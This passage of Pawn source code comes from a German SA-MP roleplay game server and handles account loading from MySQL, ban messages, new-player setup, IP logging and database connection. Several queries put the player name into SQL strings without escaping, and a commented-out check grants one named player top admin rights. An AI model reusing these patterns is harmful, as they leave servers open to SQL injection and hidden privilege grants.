					cache_get_field_content(0,"helm",val); PlayerInfo[playerid][pHelm] = strval(val);
					cache_get_field_content(0,"weather",val); PlayerInfo[playerid][pWeather] = strval(val);
					cache_get_field_content(0,"amuted",val); PlayerInfo[playerid][paMuted] = strval(val);
					cache_get_field_content(0,"amutedtime",val); PlayerInfo[playerid][paMutedTime] = strval(val);
					cache_get_field_content(0,"carkeys",val); PlayerInfo[playerid][pCarkeys] = strval(val);
					cache_get_field_content(0,"orgmember",val); PlayerInfo[playerid][pOrgMember] = strval(val);
					cache_get_field_content(0,"orgrang",val); PlayerInfo[playerid][pOrgRang] = strval(val);
					cache_get_field_content(0,"IsPlayerProjektleiter",val); PlayerInfo[playerid][pIsPlayerProjektleiter] = strval(val);
					cache_get_field_content(0,"AdminPasswort",val); PlayerInfo[playerid][pAdminPasswort] = strval(val);
					cache_get_field_content(0,"ichmusskuedigen",val); PlayerInfo[playerid][pichmusskuedigen] = strval(val);
					cache_get_field_content(0,"prisoncps", val); PlayerInfo[playerid][pPrisonCPs] = strval(val);
					cache_get_field_content(0,"fightingstyle", val); PlayerInfo[playerid][pFightingStyle] = strval(val);
	                cache_get_field_content(0,"TutorialGemacht",val); TutorialGemacht[playerid] = strval(val);
	                cache_get_field_content(0,"StartBonusErhalten",val); StartBonusErhalten[playerid] = strval(val);

	                cache_get_field_content(0,"pSpielerWiederbelebt",val); PlayerInfo[playerid][pSpielerWiederbelebt] = strval(val);








			        cache_get_field_content(0,"biggestfish",val); PlayerInfo[playerid][pBiggestFish] = strval(val);
			        cache_get_field_content(0,"job",val); PlayerInfo[playerid][pJob] = strval(val);
			        cache_get_field_content(0,"paycheck",val); PlayerInfo[playerid][pPayCheck] = strval(val);
			        cache_get_field_content(0,"headvalue",val); PlayerInfo[playerid][pHeadValue] = strval(val);
			        cache_get_field_content(0,"jailed",val); PlayerInfo[playerid][pJailed] = strval(val);
			        cache_get_field_content(0,"gangjailed",val); PlayerInfo[playerid][pGangJailed] = strval(val);
			        cache_get_field_content(0,"mauled",val); PlayerInfo[playerid][pMauled] = strval(val);
			        cache_get_field_content(0,"jailtime",val); PlayerInfo[playerid][pJailTime] = strval(val);
			        cache_get_field_content(0,"drugs",val); PlayerInfo[playerid][pDrugs] = strval(val);
			        cache_get_field_content(0,"boxmats",val); PlayerInfo[playerid][pBoxMats] = strval(val);
			        cache_get_field_content(0,"boxdrugs",val); PlayerInfo[playerid][pBoxDrugs] = strval(val);
			        cache_get_field_content(0,"leader",val); PlayerInfo[playerid][pLeader] = strval(val);
			        cache_get_field_content(0,"member",val); PlayerInfo[playerid][pMember] = strval(val);
			        cache_get_field_content(0,"smember",val); PlayerInfo[playerid][sMember] = strval(val);
			        cache_get_field_content(0,"rank",val); PlayerInfo[playerid][pRank] = strval(val);
			        cache_get_field_content(0,"char",val); PlayerInfo[playerid][pChar] = strval(val);
			        cache_get_field_content(0,"contracttime",val); PlayerInfo[playerid][pContractTime] = strval(val);
			        cache_get_field_content(0,"detskill",val); PlayerInfo[playerid][pDetSkill] = strval(val);
			        cache_get_field_content(0,"lawskill",val); PlayerInfo[playerid][pLawSkill] = strval(val);
			        cache_get_field_content(0,"mechskill",val); PlayerInfo[playerid][pMechSkill] = strval(val);
			        cache_get_field_content(0,"jackskill",val); PlayerInfo[playerid][pJackSkill] = strval(val);
			        cache_get_field_content(0,"carskill",val); PlayerInfo[playerid][pCarSkill] = strval(val);
			        cache_get_field_content(0,"newsskill",val); PlayerInfo[playerid][pNewsSkill] = strval(val);
			        cache_get_field_content(0,"drugsskill",val); PlayerInfo[playerid][pDrugsSkill] = strval(val);
			        cache_get_field_content(0,"cookskill",val); PlayerInfo[playerid][pCookSkill] = strval(val);
			        cache_get_field_content(0,"fishskill",val); PlayerInfo[playerid][pFishSkill] = strval(val);
			        cache_get_field_content(0,"shealth",val); PlayerInfo[playerid][pSHealth] = strval(val);
			        cache_get_field_content(0,"health",val); PlayerInfo[playerid][pHealth] = strval(val);
			        cache_get_field_content(0,"int",val); PlayerInfo[playerid][pInt] = strval(val);
			        cache_get_field_content(0,"local",val); PlayerInfo[playerid][pLocal] = strval(val);
			        cache_get_field_content(0,"team",val); PlayerInfo[playerid][pTeam] = strval(val);
			        cache_get_field_content(0,"model",val); PlayerInfo[playerid][pModel] = strval(val);
			        cache_get_field_content(0,"pnumber",val); PlayerInfo[playerid][pPnumber] = strval(val);
			        cache_get_field_content(0,"phousekey",val); PlayerInfo[playerid][pHouseKey] = strval(val);
			        cache_get_field_content(0,"pbiskey",val); PlayerInfo[playerid][pPbiskey] = strval(val);
			        cache_get_field_content(0,"handygeld",val); PlayerInfo[playerid][pHandyGeld] = strval(val);
			        cache_get_field_content(0,"pos_x",val); PlayerInfo[playerid][pPos_x] = strval(val);
			        cache_get_field_content(0,"pos_y",val); PlayerInfo[playerid][pPos_y] = strval(val);
			        cache_get_field_content(0,"pos_z",val); PlayerInfo[playerid][pPos_z] = strval(val);
			        cache_get_field_content(0,"carlic",val); PlayerInfo[playerid][pCarLic] = strval(val);
			        cache_get_field_content(0,"flylic",val); PlayerInfo[playerid][pFlyLic] = strval(val);
			        cache_get_field_content(0,"boatlic",val); PlayerInfo[playerid][pBoatLic] = strval(val);
			        cache_get_field_content(0,"fishlic",val); PlayerInfo[playerid][pFishLic] = strval(val);
			        cache_get_field_content(0,"gunlic",val); PlayerInfo[playerid][pGunLic] = strval(val);
			        cache_get_field_content(0,"lkwlic",val); PlayerInfo[playerid][pLKWLic] = strval(val);
			        cache_get_field_content(0,"motolic",val); PlayerInfo[playerid][pMotoLic] = strval(val);
			        cache_get_field_content(0,"zig",val); PlayerInfo[playerid][pZig] = strval(val);
			        cache_get_field_content(0,"gun1",val); PlayerInfo[playerid][pGun1] = strval(val);
			        cache_get_field_content(0,"gun2",val); PlayerInfo[playerid][pGun2] = strval(val);
			        cache_get_field_content(0,"gun3",val); PlayerInfo[playerid][pGun3] = strval(val);
			        cache_get_field_content(0,"gun4",val); PlayerInfo[playerid][pGun4] = strval(val);
			        cache_get_field_content(0,"ammo1",val); PlayerInfo[playerid][pAmmo1] = strval(val);
			        cache_get_field_content(0,"ammo2",val); PlayerInfo[playerid][pAmmo2] = strval(val);
			        cache_get_field_content(0,"ammo3",val); PlayerInfo[playerid][pAmmo3] = strval(val);
			        cache_get_field_content(0,"ammo4",val); PlayerInfo[playerid][pAmmo4] = strval(val);
			        cache_get_field_content(0,"mulltime",val); PlayerInfo[playerid][pMulltime] = strval(val);
			        cache_get_field_content(0,"payday",val); PlayerInfo[playerid][pPayDay] = strval(val);
			        cache_get_field_content(0,"paydayhad",val); PlayerInfo[playerid][pPayDayHad] = strval(val);
			        cache_get_field_content(0,"wins",val); PlayerInfo[playerid][pWins] = strval(val);
			        cache_get_field_content(0,"loses",val); PlayerInfo[playerid][pLoses] = strval(val);
			        cache_get_field_content(0,"miserperk",val); PlayerInfo[playerid][pMiserPerk] = strval(val);
			        cache_get_field_content(0,"painperk",val); PlayerInfo[playerid][pPainPerk] = strval(val);
			        cache_get_field_content(0,"traderperk",val); PlayerInfo[playerid][pTraderPerk] = strval(val);
			        cache_get_field_content(0,"warns",val); PlayerInfo[playerid][pWarns] = strval(val);
			        cache_get_field_content(0,"adjustable",val); PlayerInfo[playerid][pAdjustable] = strval(val);
			        cache_get_field_content(0,"married",val); PlayerInfo[playerid][pMarried] = strval(val);
			        cache_get_field_content(0,"playminutes",val); PlayerInfo[playerid][pPlayMinutes] = strval(val);
			        cache_get_field_content(0,"gesamtminutes",val); PlayerInfo[playerid][pGesamtMinutes] = strval(val);
			        cache_get_field_content(0,"minutessincean",val); PlayerInfo[playerid][pMinutesSinceAn] = strval(val);
			        cache_get_field_content(0,"fraksperre",val); PlayerInfo[playerid][pFrakSperre] = strval(val);
			        cache_get_field_content(0,"gehalt",val); PlayerInfo[playerid][pGehalt] = strval(val);
			        cache_get_field_content(0,"invweapon",val); PlayerInfo[playerid][pInvWeapon] = strval(val);
			        cache_get_field_content(0,"invammo",val); PlayerInfo[playerid][pInvAmmo] = strval(val);
			        cache_get_field_content(0,"invweapon2",val); PlayerInfo[playerid][pInvWeapon2] = strval(val);
			        cache_get_field_content(0,"invammo2",val); PlayerInfo[playerid][pInvAmmo2] = strval(val);
			        cache_get_field_content(0,"invmats",val); PlayerInfo[playerid][pInvMats] = strval(val);
			        cache_get_field_content(0,"invdrugs",val); PlayerInfo[playerid][pInvDrugs] = strval(val);
			        cache_get_field_content(0,"flugtime",val); PlayerInfo[playerid][pFlugTime] = strval(val);
			        cache_get_field_content(0,"farmtime",val); PlayerInfo[playerid][pFarmTime] = strval(val);
			        cache_get_field_content(0,"gdeaths",val); PlayerInfo[playerid][pGDeaths] = strval(val);
			        cache_get_field_content(0,"gkills",val); PlayerInfo[playerid][pGKills] = strval(val);
			        cache_get_field_content(0,"gwd",val); PlayerInfo[playerid][pGWD] = strval(val);
			        cache_get_field_content(0,"erstehilfe",val); PlayerInfo[playerid][pErstehilfe] = strval(val);
			        cache_get_field_content(0,"meldung",val); PlayerInfo[playerid][pMeldung] = strval(val);
			        cache_get_field_content(0,"hitsound",val); PlayerInfo[playerid][pHitsound] = strval(val);
			        cache_get_field_content(0,"ptankekey",val); PlayerInfo[playerid][pPtankekey] = strval(val);
			        cache_get_field_content(0,"zollpass",val); PlayerInfo[playerid][pZollPass] = strval(val);
			        cache_get_field_content(0,"gebannt",val); PlayerInfo[playerid][pGebannt] = strval(val);
			        cache_get_field_content(0,"pcarp",val); PlayerInfo[playerid][pCarP] = strval(val);
			        cache_get_field_content(0,"offlineflucht",val); OfflineFlucht[playerid] = strval(val);
			        cache_get_field_content(0,"wantedlevel",val); WantedLevel[playerid] = strval(val);
			        cache_get_field_content(0,"wantedpoints",val); WantedPoints[playerid] = strval(val);
			        cache_get_field_content(0,"spawnchange",val); SpawnChange[playerid] = strval(val);
			        cache_get_field_content(0,"premium",val); PlayerInfo[playerid][pDonateRank] = strval(val);
			        cache_get_field_content(0,"prison",val); PlayerInfo[playerid][pPrison] = strval(val);
			        cache_get_field_content(0,"admintickets",val); PlayerInfo[playerid][pAdminTickets] = strval(val);
					cache_get_field_content(0,"mutedtime",val); PlayerInfo[playerid][pMutedTime] = strval(val);
					cache_get_field_content(0,"tottime",val); PlayerInfo[playerid][pTotTime] = strval(val);
					cache_get_field_content(0,"tot",val); PlayerInfo[playerid][pTot] = strval(val);
				    cache_get_field_content(0,"marriedto",val); PlayerInfo[playerid][pMarriedTo] = val;
					cache_get_field_content(0,"fuel",val); PlayerInfo[playerid][pFuel] = strval(val);
					cache_get_field_content(0,"verreckt",val); PlayerInfo[playerid][pVerreckt] = strval(val);
					cache_get_field_content(0,"orgleader",val); PlayerInfo[playerid][pOrgLeader] = strval(val);  // FEHLER !!!!!!!!!!!!!!!!!!!!!!!!!!!!
					cache_get_field_content(0,"bangrund",val); PlayerInfo[playerid][pBanGrund] = val;
					cache_get_field_content(0,"banadmin",val); PlayerInfo[playerid][pBanAdmin] = val;
					cache_get_field_content(0,"bandauer",val); PlayerInfo[playerid][pBanDauer] = val;
					cache_get_field_content(0,"helm",val); PlayerInfo[playerid][pHelm] = strval(val);
					cache_get_field_content(0,"weather",val); PlayerInfo[playerid][pWeather] = strval(val);
					cache_get_field_content(0,"amuted",val); PlayerInfo[playerid][paMuted] = strval(val);
					cache_get_field_content(0,"amutedtime",val); PlayerInfo[playerid][paMutedTime] = strval(val);
					cache_get_field_content(0,"carkeys",val); PlayerInfo[playerid][pCarkeys] = strval(val);
					cache_get_field_content(0,"orgmember",val); PlayerInfo[playerid][pOrgMember] = strval(val);
					cache_get_field_content(0,"orgrang",val); PlayerInfo[playerid][pOrgRang] = strval(val);
					cache_get_field_content(0,"IsPlayerProjektleiter",val); PlayerInfo[playerid][pIsPlayerProjektleiter] = strval(val);
					cache_get_field_content(0,"AdminPasswort",val); PlayerInfo[playerid][pAdminPasswort] = strval(val);
					cache_get_field_content(0,"ichmusskuedigen",val); PlayerInfo[playerid][pichmusskuedigen] = strval(val);
					cache_get_field_content(0,"prisoncps", val); PlayerInfo[playerid][pPrisonCPs] = strval(val);
					cache_get_field_content(0,"fightingstyle", val); PlayerInfo[playerid][pFightingStyle] = strval(val);
	                cache_get_field_content(0,"TutorialGemacht",val); TutorialGemacht[playerid] = strval(val);
	                cache_get_field_content(0,"StartBonusErhalten",val); StartBonusErhalten[playerid] = strval(val);

	                cache_get_field_content(0,"pSpielerWiederbelebt",val); PlayerInfo[playerid][pSpielerWiederbelebt] = strval(val);
			*/


			    if(PlayerInfo[playerid][pGebannt] == 1)
				{
					new stringbanned[1024];
          		    format(stringbanned,sizeof(stringbanned),"Dieser Account ist gesperrt, mit ihm kann nicht gespielt werden.\n\nWenn das nicht dein Account ist, verwende einen anderen Nicknamen.\nWenn das dein Account ist und du zu unrecht gesperrt wurdest, melde dich im Forum unter www.gta-reallife.de\n\nGrund:          %s\nDauer:           %s\nAdmin:           %s",PlayerInfo[playerid][pBanGrund],PlayerInfo[playerid][pBanDauer],PlayerInfo[playerid][pBanAdmin]);
           			ShowPlayerDialog(playerid, DIALOG_BANNED, DIALOG_STYLE_MSGBOX, "GTA-City Reallife", stringbanned, "Abbrechen", "");
                    SetTimerEx("kicktimerfake", 300,false,"i",playerid);
				}
                ResetPlayerMoney(playerid);
				GivePlayerMoney(playerid,PlayerInfo[playerid][pCash]);
	        	CurrentMoney[playerid] = PlayerInfo[playerid][pCash];
			    ConsumingMoney[playerid] = 1;
				for(new fs;fs<sizeof(FightSystem);fs++)
				{
		  			GangZoneShowForPlayer(playerid,FightSystem[fs][fsZoneID],GetZoneColorOfFaction(FightSystem[fs][fsOwnerFaction]));
				}
			    if(PlayerInfo[playerid][pReg] == 0)
			    {



					new Year, Month, Day;
					getdate(Year, Month, Day);
					new Hour, Minute, Second;
					gettime(Hour, Minute, Second);
	                new query2[200];
	                format(query2,sizeof(query2),"UPDATE accounts SET regdatum = '%d.,%d.,%d, %d.,%d.,%d' WHERE name = '%s'",Day,Month,Year,Hour,Minute,Second,GetName(playerid));
				//	mysql_function_query(mysqlcon,query2, false, "", "");
				    mysql_pquery(mysqlcon, query2, "", "");



				    PlayerInfo[playerid][pLevel] = 1;
				    PlayerInfo[playerid][pSHealth] = 0;
				    PlayerInfo[playerid][pHealth] = 99.0;
			     	PlayerInfo[playerid][pPos_x] = 2246.6;
			    	PlayerInfo[playerid][pPos_y] = -1161.9;
			    	PlayerInfo[playerid][pPos_z] = 1029.7;
			    	PlayerInfo[playerid][pInt] = 15;
			     	PlayerInfo[playerid][pLocal] = 999;
			    	PlayerInfo[playerid][pTeam] = 3;
			       	PlayerInfo[playerid][pModel] = 212;
			     	PlayerInfo[playerid][pHouseKey] = 999;
			    	PlayerInfo[playerid][pPtankekey] = 255;
			    	PlayerInfo[playerid][pPbiskey] = 255;
			     	PlayerInfo[playerid][pAccount] = 0;
			      	PlayerInfo[playerid][pReg] = 1;
			      	PlayerInfo[playerid][pCarkeys] = 6;
			    	GivePlayerMoneySave(playerid, 10000);
	                PlayerInfo[playerid][pMeldung] = 1;
					SCM(playerid,COLOR_LIGHTBLUE,"Du hast einen Clover und einen Führerschein als Startbonus erhalten!");
					SCM(playerid,COLOR_LIGHTBLUE,"Nutze /carhelp!");
					SCM(playerid,COLOR_LIGHTBLUE,"Deinen Startbonus kannst du dir mit /startbonus abholen!");
					SCM(playerid,COLOR_LIGHTBLUE,"Hinweis dein Forumaccount wurde Automatisch erstellt! www.gta-reallife.de");
					PlayerInfo[playerid][pSkinauswahl] = 1;
	                SetPlayerCheckpoint(playerid,772.9239,-1363.4979,13.5267,8.0);
				    Navi[playerid] = 1;
				    FirstReport[playerid]=1;
	                PlayerInfo[playerid][pCarLic] = 1;
	                //Clover
		            dtc_AutohausCat[playerid] = 8;
				    OnPlayerBuyCar(playerid, 542, 0);
					dtc_AutohausCar[playerid] = 0;
					dtc_AutohausCat[playerid] = 2000;

					SetTimerEx("ShowPlayerCar",3000,0,"i",playerid);
					new valueeee = random(255);
					new valueeee2 = random(255);
					ChangeVehicleColor(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId], valueeee, valueeee2);
					PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarC1] = valueeee;
					PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarC2] = valueeee2;


					PlayerInfo[playerid][pFightingStyle] = 4;




	                //
				}
			    format(string,sizeof(string),"Spieler %s geladen", PlayerInfo[playerid][Name]);
			    print(string);
			    if (PlayerInfo[playerid][pDonateRank] > 2)
			    {
			        SCM(playerid, COLOR_WHITE,"Du bist Premium User.");
			    }

/*			    if(IsASkrupy(playerid))
	  		    {
					PlayerInfo[playerid][pAdmin] = 2002;
			    }*/
			    if (PlayerInfo[playerid][pAdmin] > 1)
			    {
				 	new string2[53];
			        format(string2, sizeof(string2), "Du hast dich als Level %d Admin eingeloggt.",PlayerInfo[playerid][pAdmin]);
			        SCM(playerid, COLOR_WHITE,string2);
			    }
                //
            	new tmp2[256];
                new string2[128];
            	new playername2[MAX_PLAYER_NAME];
				GetPlayerName(playerid, playername2, sizeof(playername2));
	        	format(tmp2, sizeof(tmp2), "~w~Willkommen ~n~~b~ %s", playername2);
	        	GameTextForPlayer(playerid, tmp2, 5000, 1);

				PlayerInfo[playerid][pWBBid] = WBB_GetUserIDFixed(playerid);

          		format(string2, sizeof(string2), "Erfolgreich eingeloggt, Willkommen %s",playername2);

				StopAudioStreamForPlayer(playerid);

         		SendClientMessage(playerid, COLOR_WHITE,string2);

//				WBB_GetUserID(playername2, playerid, playerid);// --> playername2 = GetName

         		//
//	  			SetSpawnInfo(playerid, PlayerInfo[playerid][pTeam], PlayerInfo[playerid][pChar],1739.1943,-1950.1700,14.1172, 1.0, -1, -1, -1, -1, -1, -1);
                // IP
                new query2[200];
                new plrIP[16];
                GetPlayerIp(playerid, plrIP, sizeof(plrIP));
                format(query2,sizeof(query2),"UPDATE accounts SET ipadresse = '%s' WHERE name = '%s'",plrIP,GetName(playerid));
			//	mysql_function_query(mysqlcon,query2, false, "", "");
				mysql_pquery(mysqlcon, query2, "", "");
                // IP

			    gPlayerLogged[playerid] = 1;
			 //   SaveMysqlPlayer(playerid);
			    PlayerInfo[playerid][pOrigin] = 1;
				SpawnPlayer(playerid);












			    if(PlayerInfo[playerid][pAdmin] > 1)
			    {
					TextDrawShowForPlayer(playerid, Textdraw0);
					TextDrawShowForPlayer(playerid, Textdraw1);
					TextDrawShowForPlayer(playerid, Textdraw2);
					TextDrawShowForPlayer(playerid, Textdraw3);
					TextDrawShowForPlayer(playerid, Textdraw4);
	        	}
			    if(PlayerInfo[playerid][pSkinauswahl] == 1)
			    {



						ShowPlayerDialog(playerid,6313, DIALOG_STYLE_INPUT, "E-Mail", "Du hast nun die Möglichkeit deine Email mit deinem Forumaccount zu verknüpfen\n\nDies ist keine Pflicht, um ohne verknüpften Forumaccount fortzufahren drücke die ESC Taste.\n\nHinweis: Eine nachträgliche verknüpfung ist nicht möglich!", "Verknüpfen", "Abbrechen");
/*



	                    SkinStatus[playerid] = playerid;
	                    SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
				        SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
				        SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
			        	SetPlayerFacingAngle(playerid, 88.4779);
					    FreezePlayer(playerid);
		        	    SetPlayerInterior(playerid, 0);
					    SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
	 				    SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
						SetPlayerVirtualWorld(playerid, 3);
*/
	        	}
				if(OfflineFlucht[playerid] == 1 )
				{
					SendClientMessage(playerid,0xFF6347AA, "* Da du Offline flucht begangen hast, wurdest du eingesperrt!");
					SendClientMessage(playerid,0xFF6347AA, "* Pro Wantedlevel 5 Minuten + 30 Minuten Strafe!");
					new sendername[MAX_PLAYER_NAME],string7[100];
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, sizeof(string7), "*[Auto-Jail] %s wurde wegen Offline-Flucht eingesperrt.", sendername);
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
						if(IsPlayerConnected(i) && IsADChatter(i))
				    	{
			     			SendClientMessage(i,COLOR_ALLDEPT,string7);
				    	}
					}
					OfflineFlucht[playerid] = 0;
					ResetPlayerWeapons(playerid);
					new wlevel = WantedLevel[playerid];
					PlayerInfo[playerid][pJailed] = 1;
					PlayerInfo[playerid][pJailTime] = (wlevel*300)+1800;
					SetPlayerInterior(playerid, 3);
			    	SendClientMessage(playerid, COLOR_LIGHTBLUE, "Alle Anwälte wurden Infomiert!");
	                SetPlayerPos(playerid,264.0360,82.2929,1001.0391);// LSPD
			        SetPlayerInterior(playerid, 6);
					WantedPoints[playerid] = 0;
//					SetPlayerWantedLevel(playerid,0);
					WantedLevel[playerid] = 0;
				}
				DateProp(playerid);












		        if(gTeam[playerid] == 0)
		        {
			     	gTeam[playerid] = 3;
		        }
		        else
		        {
			     	gTeam[playerid] = PlayerInfo[playerid][pTeam];
		        }
			}
	        else
	        {
                ShowPlayerDialog(playerid,DIALOG_LOGIN,DIALOG_STYLE_PASSWORD,"Login","{F3FF02}Falsches Passwort{FFFFFF} \n\n Willkommen auf GTA-City Reallife\n Dein Account wurde in unserer Datenbank gefunden.\n Du kannst dich nun mit deinem Passwort einloggen.","Login","Abbrechen");
		        gPlayerLogTries[playerid] += 1;
		        if(gPlayerLogTries[playerid] == 3)
				{
	 			    SendClientMessage(playerid, COLOR_GRAD2, "Du wurdest vom Server gekickt da du dein Passwort zu oft falsch eingegeben hast");
					SetTimerEx("kicktimer", 300,false,"i",playerid);
				}
	  }
 }
	forward CheckAcc(name[],playerid);
	public CheckAcc(name[],playerid)
	{
		new rows;
	//	cache_get_data(rows,fields);
	    cache_get_row_count(rows);
		if(!rows)
		{
			PlayerInfo[playerid][pCheckAcc] = 1;
		    gPlayerAccount[playerid] = 0;
	 	}

//		ShowPlayerDialog(playerid, DIALOG_WELCOME, DIALOG_STYLE_MSGBOX, "Schwerwiegender Serverfehler", "Aufgrund eines Schwerwiegenden Serverfehlers wird der Login zum Scutz deines Accounts gesperrt.\nMelde dich bei der Administration falls dieses Problem in Wenigen Minuten nicht behoben ist", "Close", "");

		else
		{
			PlayerInfo[playerid][pCheckAcc] = 1;
	 	    gPlayerAccount[playerid] = 1;
	 	}
		printf("Rows %d - Player %s.",rows,GetName(playerid));  //-> The number is 42.

	}
	/*
	stock ConnectMySQL()
    {
    mysql_debug(1);
    mysqlcon = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_DATABASE, MYSQL_PASS); //Wir versuchen mit den Angaben die wir oben im Script gemacht haben uns mit dem MySQL Server zu verbinden.
    if(mysql_ping() == 1) //Es wird überprüft ob die Verbindung steht.
    {
        //Falls ja wird das in die Console geschrieben und die Funktion wird beendet.
        print("<-| [MYSQL] Verbindung zur Datenbank wurde erfolgreich hergestellt!");
        return true;
    }
    else
    {
        //Falls nicht wird erneut versucht eine Verbindung aufzubauen.
        print("<-| [MYSQL] Es konnte keine Verbindung zur Datenbank hergestellt werden!");
        print("<-| [MYSQL] Es wird erneut versucht eine Verbindung zur Datenbank herzustellen!");
        mysql_debug(1);
        mysqlcon = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_DATABASE, MYSQL_PASS);
        if(mysql_ping() == 1)
        {
            print("<-| [MYSQL] Es konnte im 2 Versuch eine Verbindung hergestellt werden!");
            return true;
        }
        else
        {
            //Falls das auch nicht Funktioniert wird der Server zur Sicherheit wieder heruntergefahren.
            print("<-| [MYSQL] Es konnte keine Verbindung zur Datenbank hergestellt werden!");
            print("<-| [MYSQL] Der Server wird nun beendet!");
            SendRconCommand("exit");
            return true;
        }
    }*/


//}   // Hier hab ich ne klammer auskommentiert

/*
stock ConnectMySQL()
{
    mysql_debug(1);
    mysqlcon = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_DATABASE, MYSQL_PASS); //Wir versuchen mit den Angaben die wir oben im Script gemacht haben uns mit dem MySQL Server zu verbinden.
    if(mysql_ping() == 1) //Es wird überprüft ob die Verbindung steht.
    {
        //Falls ja wird das in die Console geschrieben und die Funktion wird beendet.
        print("<-| [MYSQL] Verbindung zur Datenbank wurde erfolgreich hergestellt!");
        return true;
    }
    else
    {
        //Falls nicht wird erneut versucht eine Verbindung aufzubauen.
        print("<-| [MYSQL] Es konnte keine Verbindung zur Datenbank hergestellt werden!");
        print("<-| [MYSQL] Es wird erneut versucht eine Verbindung zur Datenbank herzustellen!");
        mysql_debug(1);
        mysqlcon = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_DATABASE, MYSQL_PASS);
        if(mysql_ping() == 1)
        {
            print("<-| [MYSQL] Es konnte im 2 Versuch eine Verbindung hergestellt werden!");
            return true;
        }
        else
        {
            //Falls das auch nicht Funktioniert wird der Server zur Sicherheit wieder heruntergefahren.
            print("<-| [MYSQL] Es konnte keine Verbindung zur Datenbank hergestellt werden!");
            print("<-| [MYSQL] Der Server wird nun beendet!");
            SendRconCommand("exit");
            return true;
        }
	}
}*/

stock MySQL_SetupConnection(ttl = 3)
{
	print("[MySQL] Verbindungsaufbau...");
	//mysql_log();  //<- Kommentar vor mysql_log entfernen um den MySQL Debug-Modus zu aktivieren

	mysqlcon = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS, MYSQL_DATABASE,"3306");

	//Prüfen und gegebenenfalls wiederholen
	if(mysql_errno(mysqlcon) != 0)
	{
		//Fehler im Verbindungsaufbau, prüfe ob ein weiterer Versuch gestartet werden soll
		if(ttl > 1)
		{
			//Versuche erneut eine Verbindung aufzubauen
			print("[MySQL] Es konnte keine Verbindung zur Datenbank hergestellt werden.");
			printf("[MySQL] Starte neuen Verbindungsversuch (TTL: %d).", ttl-1);
			return MySQL_SetupConnection(ttl-1);
		}
		else
		{
			//Abbrechen und Server schließen
			print("[MySQL] Es konnte keine Verbindung zur Datenbank hergestellt werden.");
			print("[MySQL] Bitte prüfen Sie die Verbindungsdaten.");
			print("[MySQL] Der Server wird heruntergefahren.");
			return SendRconCommand("exit");
		}
	}
	printf("[MySQL] Die Verbindung zur Datenbank wurde erfolgreich hergestellt! mysqlcon: %d", _:mysqlcon);
	return 1;
}



forward LoadRangNames();
public LoadRangNames()
{
			new query[256];
			for(new idx=1; idx <= sizeof(Rangname); idx++)
			{
				format(query, sizeof(query), "SELECT * FROM gangrangs WHERE fID=%i",idx);
//				mysql_function_query(mysqlcon,query,true,"LoadMysqlRangNames","i",idx);
                mysql_pquery(mysqlcon, query, "LoadMysqlRangNames", "i",idx);
			//	mysql_pquery(mysqlcpon,query,
			}
			print("Rangnamen geladen!");
			return 1;
}
forward LoadMysqlRangNames(idx);
public LoadMysqlRangNames(idx)
{
	new rows,temp[128];
	//cache_get_data(rows, fields);
	cache_get_row_count(rows);
	if(rows)
	{
         cache_get_value_name(0,"rangname1",temp), format(Rangname[idx][Rang1], 32, temp);
         cache_get_value_name(0,"rangname2",temp), format(Rangname[idx][Rang2], 32, temp);
         cache_get_value_name(0,"rangname3",temp), format(Rangname[idx][Rang3], 32, temp);
         cache_get_value_name(0,"rangname4",temp), format(Rangname[idx][Rang4], 32, temp);
         cache_get_value_name(0,"rangname5",temp), format(Rangname[idx][Rang5], 32, temp);
         cache_get_value_name(0,"rangname6",temp), format(Rangname[idx][Rang6], 32, temp);
         cache_get_value_name(0,"rangname7",temp), format(Rangname[idx][Rang7], 32, temp);
         cache_get_value_name(0,"rangname8",temp), format(Rangname[idx][Rang8], 32, temp);
         cache_get_value_name(0,"rangname9",temp), format(Rangname[idx][Rang9], 32, temp);
         cache_get_value_name(0,"rangname10",temp), format(Rangname[idx][Rang10], 32, temp);
         cache_get_value_name(0,"rangname11",temp), format(Rangname[idx][Rang11], 32, temp);
         cache_get_value_name(0,"rangname12",temp), format(Rangname[idx][Rang12], 32, temp);
	}
}
forward SaveAllAccs();
public SaveAllAccs()
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		SaveMysqlPlayer(i);
	}
}






/*
forward hostnametimer();
public hostnametimer()
{
	if(hostname == 0)
	{
		SendRconCommand("hostname .:: MR - Mystery Reallife - Viele Events! ::.");
		hostname = 1;
	}
	else if(hostname == 1)
	{
		SendRconCommand("hostname .:: MR - Mystery Reallife  - Update R7,2 ::.");
		hostname = 2;
	}
	else if(hostname == 2)
	{
		SendRconCommand("hostname .:: MR - Mystery Reallife  - Leader gesucht ::.");
		hostname = 3;
	}
	else if(hostname == 3)
	{
		SendRconCommand("hostname .:: MR - Mystery Reallife  - Wir suchen dich! ::.");
		hostname = 0;
	}

}
*/




public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{


	if(PlayerInfo[playerid][pWeather] == 0)
	{
		SetPlayerWeather(playerid,12);
	}
	if(PlayerInfo[playerid][pWeather] == 1)
	{
	    if(newinteriorid >= 1)
	    {
			SetPlayerWeather(playerid,12);
		}
	    else if(newinteriorid == 0)
	    {
			SetPlayerWeather(playerid,-77);
		}
	}
//	SetSyncTime (playerid, SYNC_TYPE_POS);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
			if (PlayerInfo[i][pAdmin] > 2)
			{
				if (WatchingTV[i] == 1)
				{
					if (playerid == Spectate[i])
					{
						SetPlayerInterior(i,newinteriorid);
                        TogglePlayerSpectating(i, 1);
					    PlayerSpectatePlayer(i, Spectate[i]);
					}
				}
			}
		}
	}
    return 1;
}
forward Speedometer(playerid);
